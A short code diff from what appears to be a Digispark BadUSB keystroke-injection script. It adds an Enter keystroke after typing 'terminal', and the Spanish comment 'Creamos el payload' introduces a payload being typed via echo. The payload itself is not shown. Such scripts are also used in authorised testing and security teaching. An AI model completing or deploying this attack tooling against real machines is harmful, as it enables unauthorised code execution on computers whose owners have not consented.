@@ -51,6 +51,8 @@ DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT);
 DigiKeyboard.delay(1000);
 DigiKeyboard.print("terminal");
 DigiKeyboard.delay(500);
+DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
+DigiKeyboard.delay(1000);
 
 // Creamos el payload
 DigiKeyboard.print("echo");
